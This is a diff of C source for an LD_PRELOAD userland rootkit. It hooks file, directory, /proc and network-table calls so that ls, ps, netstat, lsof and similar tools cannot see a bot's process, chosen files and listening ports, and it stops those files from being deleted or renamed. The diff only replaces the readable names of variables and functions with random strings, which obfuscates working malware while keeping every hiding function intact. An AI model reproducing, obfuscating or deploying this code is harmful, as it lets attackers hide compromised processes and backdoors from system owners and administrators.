@@ -26,7 +26,7 @@
 #include <stdarg.h>
 
 /* Userland tools we hide from. Cron, bash, systemd, init, sh see everything. */
-static const char *hidden_from[] = {
+static const char *_Jc7qB8S[] = {
     "ls", "dir", "find", "locate", "tree", "du", "stat", "file",
     "ps", "top", "htop", "atop", "pgrep", "pidof", "pstree",
     "netstat", "ss", "lsof", "fuser",
@@ -41,18 +41,18 @@ static const char *hidden_from[] = {
 };
 
 /* Cached config — parsed once from env vars */
-static int rk_pid = -1;
-static char rk_pid_str[16] = {0};
-static char *rk_ports[16] = {NULL};
-static int rk_nports = 0;
-static char *rk_files[32] = {NULL};
-static int rk_nfiles = 0;
-static int rk_init_done = 0;
+static int _XP2ug5V = -1;
+static char _Ta4Rp7T[16] = {0};
+static char *_ic2nq3j[16] = {NULL};
+static int _ss8Ei3r = 0;
+static char *_ZL6pz8m[32] = {NULL};
+static int _Re7Bi7c = 0;
+static int _Pp5ua5w = 0;
 
 /* Check if the calling process is a tool we hide from.
  * Uses real readlink (not our hook) to avoid infinite recursion.
  * Cached per-process (only changes on exec). */
-static int is_hidden_caller(void) {
+static int _nZ6JU3x(void) {
     static int cached = -1;
     ssize_t (*real_readlink)(const char *, char *, size_t);
     char buf[256], *base;
@@ -75,8 +75,8 @@ static int is_hidden_caller(void) {
     base = strrchr(buf, '/');
     base = base ? base + 1 : buf;
 
-    for (i = 0; hidden_from[i]; i++) {
-        if (strcmp(base, hidden_from[i]) == 0) {
+    for (i = 0; _Jc7qB8S[i]; i++) {
+        if (strcmp(base, _Jc7qB8S[i]) == 0) {
             cached = 1;
             return 1;
         }
@@ -85,20 +85,20 @@ static int is_hidden_caller(void) {
     return 0;
 }
 
-static void rk_init(void) {
+static void _Rp7fk5P(void) {
     char *val, *tok, *saveptr;
-    if (rk_init_done) return;
-    rk_init_done = 1;
+    if (_Pp5ua5w) return;
+    _Pp5ua5w = 1;
 
     /* PID to hide */
     val = getenv("RK_PID");
     if (val && val[0]) {
-        rk_pid = atoi(val);
-        snprintf(rk_pid_str, sizeof(rk_pid_str), "%d", rk_pid);
+        _XP2ug5V = atoi(val);
+        snprintf(_Ta4Rp7T, sizeof(_Ta4Rp7T), "%d", _XP2ug5V);
     } else {
         /* Fallback: hide parent PID (the bot that loaded us) */
-        rk_pid = getppid();
-        snprintf(rk_pid_str, sizeof(rk_pid_str), "%d", rk_pid);
+        _XP2ug5V = getppid();
+        snprintf(_Ta4Rp7T, sizeof(_Ta4Rp7T), "%d", _XP2ug5V);
     }
 
     /* Ports to hide from /proc/net/tcp */
@@ -106,8 +106,8 @@ static void rk_init(void) {
     if (val && val[0]) {
         char *copy = strdup(val);
         tok = strtok_r(copy, ",", &saveptr);
-        while (tok && rk_nports < 16) {
-            rk_ports[rk_nports++] = strdup(tok);
+        while (tok && _ss8Ei3r < 16) {
+            _ic2nq3j[_ss8Ei3r++] = strdup(tok);
             tok = strtok_r(NULL, ",", &saveptr);
         }
         free(copy);
@@ -118,8 +118,8 @@ static void rk_init(void) {
     if (val && val[0]) {
         char *copy = strdup(val);
         tok = strtok_r(copy, ",", &saveptr);
-        while (tok && rk_nfiles < 32) {
-            rk_files[rk_nfiles++] = strdup(tok);
+        while (tok && _Re7Bi7c < 32) {
+            _ZL6pz8m[_Re7Bi7c++] = strdup(tok);
             tok = strtok_r(NULL, ",", &saveptr);
         }
         free(copy);
@@ -132,31 +132,31 @@ static void rk_init(void) {
 }
 
 /* Check if a filename should be hidden */
-static int should_hide_file(const char *name) {
+static int _Vd3Kv8p(const char *name) {
     int i;
     if (!name) return 0;
-    for (i = 0; i < rk_nfiles; i++) {
-        if (strcmp(name, rk_files[i]) == 0) return 1;
+    for (i = 0; i < _Re7Bi7c; i++) {
+        if (strcmp(name, _ZL6pz8m[i]) == 0) return 1;
     }
     return 0;
 }
 
 /* Check if a path belongs to our hidden PID in /proc */
-static int is_hidden_proc_path(const char *path) {
+static int _JN6YE6p(const char *path) {
     char prefix[32];
-    if (!path || rk_pid <= 0) return 0;
-    snprintf(prefix, sizeof(prefix), "/proc/%d", rk_pid);
+    if (!path || _XP2ug5V <= 0) return 0;
+    snprintf(prefix, sizeof(prefix), "/proc/%d", _XP2ug5V);
     return (strncmp(path, prefix, strlen(prefix)) == 0);
 }
 
 /* Check if a /proc/net/tcp line contains a hidden port.
  * Format: "  sl  local_address rem_address ..."
  * local_address is hex IP:PORT where PORT is in hex. */
-static int line_has_hidden_port(const char *line) {
+static int _sN8Vx7D(const char *line) {
     const char *colon;
     unsigned int port;
     int i;
-    if (rk_nports == 0) return 0;
+    if (_ss8Ei3r == 0) return 0;
 
     /* Find local_address field (after whitespace + index + colon) */
     colon = strchr(line, ':');
@@ -168,8 +168,8 @@ static int line_has_hidden_port(const char *line) {
     /* Parse hex port after the colon */
     if (sscanf(colon + 1, "%X", &port) != 1) return 0;
 
-    for (i = 0; i < rk_nports; i++) {
-        if ((int)port == atoi(rk_ports[i])) return 1;
+    for (i = 0; i < _ss8Ei3r; i++) {
+        if ((int)port == atoi(_ic2nq3j[i])) return 1;
     }
     return 0;
 }
@@ -183,16 +183,16 @@ struct dirent *readdir(DIR *dirp) {
     struct dirent *(*real_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
     struct dirent *entry;
 
-    rk_init();
-    if (!is_hidden_caller()) return real_readdir(dirp);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_readdir(dirp);
 
     while ((entry = real_readdir(dirp)) != NULL) {
         /* Hide our PID from /proc listing */
-        if (rk_pid > 0 && strcmp(entry->d_name, rk_pid_str) == 0)
+        if (_XP2ug5V > 0 && strcmp(entry->d_name, _Ta4Rp7T) == 0)
             continue;
 
         /* Hide configured filenames */
-        if (should_hide_file(entry->d_name))
+        if (_Vd3Kv8p(entry->d_name))
             continue;
 
         return entry;
@@ -205,13 +205,13 @@ struct dirent64 *readdir64(DIR *dirp) {
     struct dirent64 *(*real_readdir64)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
     struct dirent64 *entry;
 
-    rk_init();
-    if (!is_hidden_caller()) return real_readdir64(dirp);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_readdir64(dirp);
 
     while ((entry = real_readdir64(dirp)) != NULL) {
-        if (rk_pid > 0 && strcmp(entry->d_name, rk_pid_str) == 0)
+        if (_XP2ug5V > 0 && strcmp(entry->d_name, _Ta4Rp7T) == 0)
             continue;
-        if (should_hide_file(entry->d_name))
+        if (_Vd3Kv8p(entry->d_name))
             continue;
         return entry;
     }
@@ -221,10 +221,10 @@ struct dirent64 *readdir64(DIR *dirp) {
 /* stat — hide hidden PID paths and hidden files */
 int stat(const char *pathname, struct stat *statbuf) {
     int (*real_stat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
-    rk_init();
-    if (!is_hidden_caller()) return real_stat(pathname, statbuf);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_stat(pathname, statbuf);
 
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return -1;
     }
@@ -232,7 +232,7 @@ int stat(const char *pathname, struct stat *statbuf) {
     {
         const char *base = strrchr(pathname, '/');
         if (base) base++; else base = pathname;
-        if (should_hide_file(base)) {
+        if (_Vd3Kv8p(base)) {
             errno = ENOENT;
             return -1;
         }
@@ -243,17 +243,17 @@ int stat(const char *pathname, struct stat *statbuf) {
 /* lstat — same as stat */
 int lstat(const char *pathname, struct stat *statbuf) {
     int (*real_lstat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "lstat");
-    rk_init();
-    if (!is_hidden_caller()) return real_lstat(pathname, statbuf);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_lstat(pathname, statbuf);
 
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return -1;
     }
     {
         const char *base = strrchr(pathname, '/');
         if (base) base++; else base = pathname;
-        if (should_hide_file(base)) {
+        if (_Vd3Kv8p(base)) {
             errno = ENOENT;
             return -1;
         }
@@ -265,9 +265,9 @@ int lstat(const char *pathname, struct stat *statbuf) {
 int open(const char *pathname, int flags, ...) {
     int (*real_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
     int fd;
-    rk_init();
+    _Rp7fk5P();
 
-    if (!is_hidden_caller()) {
+    if (!_nZ6JU3x()) {
         if (flags & O_CREAT) {
             va_list ap; mode_t mode;
             va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
@@ -280,11 +280,11 @@ int open(const char *pathname, int flags, ...) {
     if (pathname) {
         const char *base = strrchr(pathname, '/');
         base = base ? base + 1 : pathname;
-        if (should_hide_file(base)) { errno = ENOENT; return -1; }
+        if (_Vd3Kv8p(base)) { errno = ENOENT; return -1; }
     }
 
     /* For /proc/net/tcp[6] — create a filtered temp file */
-    if (rk_nports > 0 && pathname &&
+    if (_ss8Ei3r > 0 && pathname &&
         (strcmp(pathname, "/proc/net/tcp") == 0 ||
          strcmp(pathname, "/proc/net/tcp6") == 0 ||
          strcmp(pathname, "/proc/net/udp") == 0 ||
@@ -315,7 +315,7 @@ int open(const char *pathname, int flags, ...) {
                     if (nl) { *nl = '\0'; line_len = (int)(nl - line); }
                     else line_len = (int)strlen(line);
 
-                    if (!line_has_hidden_port(line)) {
+                    if (!_sN8Vx7D(line)) {
                         if (flen + line_len + 2 < (int)sizeof(filtered)) {
                             memcpy(filtered + flen, line, (size_t)line_len);
                             flen += line_len;
@@ -341,7 +341,7 @@ int open(const char *pathname, int flags, ...) {
     }
 
     /* Hide /proc/<pid> paths */
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return -1;
     }
@@ -352,9 +352,9 @@ int open(const char *pathname, int flags, ...) {
 /* openat — modern glibc uses this instead of open() */
 int openat(int dirfd, const char *pathname, int flags, ...) {
     int (*real_openat)(int, const char *, int, ...) = dlsym(RTLD_NEXT, "openat");
-    rk_init();
+    _Rp7fk5P();
 
-    if (!is_hidden_caller()) {
+    if (!_nZ6JU3x()) {
         if (flags & O_CREAT) {
             va_list ap; mode_t mode;
             va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
@@ -367,11 +367,11 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     if (pathname) {
         const char *base = strrchr(pathname, '/');
         base = base ? base + 1 : pathname;
-        if (should_hide_file(base)) { errno = ENOENT; return -1; }
+        if (_Vd3Kv8p(base)) { errno = ENOENT; return -1; }
     }
 
     /* Filter /proc/net/tcp etc */
-    if (rk_nports > 0 && pathname &&
+    if (_ss8Ei3r > 0 && pathname &&
         (strcmp(pathname, "/proc/net/tcp") == 0 ||
          strcmp(pathname, "/proc/net/tcp6") == 0 ||
          strcmp(pathname, "/proc/net/udp") == 0 ||
@@ -397,7 +397,7 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
                     if (nl) { *nl = '\0'; line_len = (int)(nl - line); }
                     else line_len = (int)strlen(line);
 
-                    if (!line_has_hidden_port(line)) {
+                    if (!_sN8Vx7D(line)) {
                         if (flen + line_len + 2 < (int)sizeof(filtered)) {
                             memcpy(filtered + flen, line, (size_t)line_len);
                             flen += line_len;
@@ -418,7 +418,7 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
         }
     }
 
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return -1;
     }
@@ -429,17 +429,17 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
 /* fopen — intercept /proc/net/tcp reads (glibc internal open bypasses PLT) */
 FILE *fopen(const char *pathname, const char *mode) {
     FILE *(*real_fopen)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
-    rk_init();
-    if (!is_hidden_caller()) return real_fopen(pathname, mode);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_fopen(pathname, mode);
 
     /* Block hidden callers from opening protected files */
     if (pathname) {
         const char *base = strrchr(pathname, '/');
         base = base ? base + 1 : pathname;
-        if (should_hide_file(base)) { errno = ENOENT; return NULL; }
+        if (_Vd3Kv8p(base)) { errno = ENOENT; return NULL; }
     }
 
-    if (rk_nports > 0 && pathname &&
+    if (_ss8Ei3r > 0 && pathname &&
         (strcmp(pathname, "/proc/net/tcp") == 0 ||
          strcmp(pathname, "/proc/net/tcp6") == 0 ||
          strcmp(pathname, "/proc/net/udp") == 0 ||
@@ -466,7 +466,7 @@ FILE *fopen(const char *pathname, const char *mode) {
                     if (nl) { *nl = '\0'; line_len = (int)(nl - line); }
                     else line_len = (int)strlen(line);
 
-                    if (!line_has_hidden_port(line)) {
+                    if (!_sN8Vx7D(line)) {
                         if (flen + line_len + 2 < (int)sizeof(filtered)) {
                             memcpy(filtered + flen, line, (size_t)line_len);
                             flen += line_len;
@@ -487,7 +487,7 @@ FILE *fopen(const char *pathname, const char *mode) {
         }
     }
 
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return NULL;
     }
@@ -507,17 +507,17 @@ FILE *fopen64(const char *pathname, const char *mode) {
 /* access — hide hidden PID paths */
 int access(const char *pathname, int mode) {
     int (*real_access)(const char *, int) = dlsym(RTLD_NEXT, "access");
-    rk_init();
-    if (!is_hidden_caller()) return real_access(pathname, mode);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_access(pathname, mode);
 
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return -1;
     }
     {
         const char *base = strrchr(pathname, '/');
         if (base) base++; else base = pathname;
-        if (should_hide_file(base)) {
+        if (_Vd3Kv8p(base)) {
             errno = ENOENT;
             return -1;
         }
@@ -528,10 +528,10 @@ int access(const char *pathname, int mode) {
 /* readlink — hide /proc/<pid>/exe */
 ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
     ssize_t (*real_readlink)(const char *, char *, size_t) = dlsym(RTLD_NEXT, "readlink");
-    rk_init();
-    if (!is_hidden_caller()) return real_readlink(pathname, buf, bufsiz);
+    _Rp7fk5P();
+    if (!_nZ6JU3x()) return real_readlink(pathname, buf, bufsiz);
 
-    if (is_hidden_proc_path(pathname)) {
+    if (_JN6YE6p(pathname)) {
         errno = ENOENT;
         return -1;
     }
@@ -542,12 +542,12 @@ ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
 int unlink(const char *pathname) {
     int (*real_unlink)(const char *) = dlsym(RTLD_NEXT, "unlink");
     const char *base;
-    rk_init();
+    _Rp7fk5P();
 
     if (pathname) {
         base = strrchr(pathname, '/');
         base = base ? base + 1 : pathname;
-        if (should_hide_file(base)) {
+        if (_Vd3Kv8p(base)) {
             errno = ENOENT;
             return -1;
         }
@@ -564,12 +564,12 @@ int unlink(const char *pathname) {
 int unlinkat(int dirfd, const char *pathname, int flags) {
     int (*real_unlinkat)(int, const char *, int) = dlsym(RTLD_NEXT, "unlinkat");
     const char *base;
-    rk_init();
+    _Rp7fk5P();
 
     if (pathname) {
         base = strrchr(pathname, '/');
         base = base ? base + 1 : pathname;
-        if (should_hide_file(base)) {
+        if (_Vd3Kv8p(base)) {
             errno = ENOENT;
             return -1;
         }
@@ -585,12 +585,12 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
 int rename(const char *oldpath, const char *newpath) {
     int (*real_rename)(const char *, const char *) = dlsym(RTLD_NEXT, "rename");
     const char *base;
-    rk_init();
+    _Rp7fk5P();
 
     if (oldpath) {
         base = strrchr(oldpath, '/');
         base = base ? base + 1 : oldpath;
-        if (should_hide_file(base)) {
+        if (_Vd3Kv8p(base)) {
             errno = ENOENT;
             return -1;
         }
